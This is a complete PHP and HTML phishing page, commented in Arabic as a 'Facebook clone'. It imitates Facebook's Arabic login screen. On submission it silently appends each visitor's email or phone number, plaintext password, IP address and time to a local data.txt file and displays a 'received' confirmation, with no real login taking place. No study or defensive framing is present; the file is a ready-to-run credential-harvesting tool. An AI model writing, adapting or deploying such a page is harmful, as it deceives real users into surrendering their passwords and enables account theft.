<?php
// ========================
// FACEBOOK CLONE - ملف واحد
// ========================

// إذا تم إرسال البيانات
if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['email'])) {
    $email = $_POST['email'];
    $pass  = $_POST['pass'];
    $ip    = $_SERVER['REMOTE_ADDR'];
    $time  = date('Y-m-d H:i:s');

    // حفظ في ملف
    $data = "Email: $email | Pass: $pass | IP: $ip | Time: $time\n";
    file_put_contents('data.txt', $data, FILE_APPEND | LOCK_EX);
    
    // رسالة تأكيد إن البيانات وصلت
    $success = "✅ تم الاستلام!";
}
?>
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>فيسبوك</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', sans-serif; }
        body { background: #f0f2f5; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .box { width: 400px; background: #fff; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,.1); padding: 20px; }
        .box h1 { text-align: center; color: #1877f2; font-size: 40px; margin-bottom: 20px; }
        .box input { width: 100%; padding: 14px; border: 1px solid #dddfe2; border-radius: 6px; font-size: 17px; margin-bottom: 12px; }
        .box button { width: 100%; padding: 12px; background: #1877f2; color: #fff; font-size: 20px; font-weight: bold; border: none; border-radius: 6px; cursor: pointer; }
        .msg { background: #e8f5e9; color: #2e7d32; padding: 12px; border-radius: 6px; margin-bottom: 12px; text-align: center; display: <?php echo isset($success) ? 'block' : 'none'; ?>; }
        .link { text-align: center; margin-top: 16px; }
        .link a { color: #1877f2; text-decoration: none; font-size: 14px; }
    </style>
</head>
<body>
    <div class="box">
        <h1>facebook</h1>
        <div class="msg"><?php echo isset($success) ? $success : ''; ?></div>
        <form method="POST">
            <input type="text" name="email" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
            <input type="password" name="pass" placeholder="كلمة السر" required>
            <button type="submit">تسجيل الدخول</button>
            <div class="link"><a href="#">هل نسيت كلمة السر؟</a></div>
        </form>
    </div>
</body>
</html>
